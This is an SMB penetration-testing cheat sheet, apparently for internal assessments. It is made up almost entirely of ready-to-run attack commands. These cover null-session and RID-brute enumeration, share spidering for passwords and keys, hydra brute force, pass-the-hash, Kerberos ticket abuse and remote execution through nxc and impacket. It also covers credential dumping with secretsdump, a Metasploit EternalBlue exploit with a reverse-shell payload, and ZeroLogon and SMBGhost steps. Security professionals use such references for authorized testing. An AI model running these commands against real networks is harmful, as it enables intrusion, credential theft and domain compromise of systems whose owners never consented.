# SMB (139, 445)

!!! tip "Start here"
    Check null session first: `netexec smb 10.10.10.10 -u '' -p ''`. If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

---

## Enumeration

```bash
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
nxc smb 10.10.10.10
enum4linux-ng -A 10.10.10.10
```

---

## User Enumeration

```bash
# RID brute — works on many DCs even with null/guest
nxc smb 10.10.10.10 -u '' -p '' --rid-brute
nxc smb 10.10.10.10 -u <user> -p <password> --rid-brute

# Authenticated user list
nxc smb 10.10.10.10 -u <user> -p <password> --users
enum4linux-ng -U 10.10.10.10

# Direct LSARPC
lookupsid.py 'EXAMPLE/<user>:<password>'@10.10.10.10
```

---

## Password Policy

Pull this *before* spraying — locking out ten domain users on the first day is a bad look.

```bash
nxc smb 10.10.10.10 -u <user> -p <password> --pass-pol
enum4linux-ng -P 10.10.10.10
```

---

## Share Enumeration

```bash
smbclient -L //10.10.10.10 -U ''
smbclient -L //10.10.10.10 -U guest
nmap --script smb-enum-shares -p 445 10.10.10.10
nxc smb 10.10.10.10 --shares
```

Connect to a share:

```bash
smbclient //10.10.10.10/ShareName -U <user>
```

Download files once connected:

```bash
smb> get filename
smb> mget *
```

---

## smbmap

Enumerate shares and permissions, then read/write files without an interactive shell.

```bash
# enumerate shares (unauthenticated / authenticated)
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u <user> -p <password>

# recursive directory listing
smbmap -H 10.10.10.10 -u <user> -p <password> -r <ShareName>

# download a file (remote path uses backslashes)
smbmap -H 10.10.10.10 -u <user> -p <password> --download '<ShareName>\path\to\file.txt'

# upload a file (remote path uses backslashes)
smbmap -H 10.10.10.10 -u <user> -p <password> --upload /local/file.txt '<ShareName>\file.txt'

# pass-the-hash
smbmap -H 10.10.10.10 -u <user> -p '<lm>:<ntlm>'
```

---

## Share Spidering

Once you can read shares, recursively grep for credentials, configs, and key material.

```bash
# nxc spider — fast, regex-based, runs across multiple hosts
nxc smb 10.10.10.10 -u <user> -p <password> -M spider_plus
nxc smb 10.10.10.10 -u <user> -p <password> --spider <share> --regex 'password|secret|cred'

# manspider — heavier, greps file *contents* including office docs and PDFs
manspider 10.10.10.10 -u <user> -p <password> -c 'password' 'apikey' 'BEGIN PRIVATE KEY'
```

Files worth grepping for: `unattend.xml`, `sysprep.inf`, `*.kdbx`, `*.ps1`, `web.config`, `Groups.xml` (GPP cpassword).

---

## Brute Force

```bash
nxc smb 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

---

## Pass-the-Hash

```bash
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## Kerberos Authentication

When NTLM is disabled, restricted (e.g. account is in `Protected Users`), or you only have a TGT, every impacket tool accepts Kerberos:

```bash
# Mint a TGT from creds, hash, or AES key
getTGT.py EXAMPLE/<user>:<password>
getTGT.py EXAMPLE/<user> -hashes :<ntlm-hash>
getTGT.py EXAMPLE/<user> -aesKey <aes256-key>

# Use the cached ticket
export KRB5CCNAME=<user>.ccache
psexec.py -k -no-pass EXAMPLE/<user>@dc01.example.local
```

Target by FQDN (not IP) when using Kerberos — SPNs are tied to hostnames.

---

## Remote Command Execution

For one-off commands, `nxc -x` is the daily driver — it wraps the same execution methods as the impacket tools below, but runs across many hosts at once and handles cred spraying:

```bash
# CMD execution (default method is wmiexec — no service, no binary on disk)
nxc smb 10.10.10.10 -u <user> -p <password> -x 'whoami'

# PowerShell execution
nxc smb 10.10.10.10 -u <user> -p <password> -X 'Get-Process'

# Switch methods if one is blocked or detected
nxc smb 10.10.10.10 -u <user> -p <password> --exec-method smbexec -x 'whoami'
nxc smb 10.10.10.10 -u <user> -p <password> --exec-method atexec -x 'whoami'
```

Reach for the impacket tools when you need an **interactive shell** — `nxc -x` runs each command in a fresh session, so you can't `cd` and have state persist. Same underlying mechanisms, different UX:

```bash
# Full SYSTEM shell — drops binary + creates service (noisy, but reliable)
impacket-psexec EXAMPLE/<user>:<password>@10.10.10.10

# DCOM/WMI semi-interactive — quieter than psexec
impacket-wmiexec EXAMPLE/<user>:<password>@10.10.10.10

# Semi-interactive via SMB named pipes — no binary on disk
impacket-smbexec EXAMPLE/<user>:<password>@10.10.10.10

# One-shot via scheduled task — useful when 445 is filtered but RPC/135 is open
impacket-atexec EXAMPLE/<user>:<password>@10.10.10.10 'whoami'
```

All accept `-hashes :<ntlm-hash>` for pass-the-hash and `-k -no-pass` for Kerberos with a cached ticket.

---

## Credential Dumping

```bash
impacket-secretsdump EXAMPLE/<user>@10.10.10.10
impacket-secretsdump EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>
```

---

## Known Vulnerabilities

### EternalBlue (MS17-010)

SMBv1 RCE. Still occasionally found on unpatched 2008 R2 / 7 boxes.

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
```

If vulnerable:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

### SMBGhost (CVE-2020-0796)

SMBv3.1.1 compression bug — affects unpatched Windows 10 1903/1909 and Server 2004/1909. Public RCE PoCs are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.

```bash
nmap -p 445 --script smb-protocols 10.10.10.10   # confirm SMB 3.1.1 with compression
nxc smb 10.10.10.10 -M smbghost
```

### ZeroLogon (CVE-2020-1472)

Netlogon protocol — not strictly SMB, but it lives in the same DC-attack workflow.

```bash
nxc smb 10.10.10.10 -M zerologon
```

If vulnerable: back up the DC machine account hash with `secretsdump.py`, run a PoC that resets the machine password to empty, dump domain creds, then *restore* the original password to avoid breaking the DC.

!!! tip "Real-world"
    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
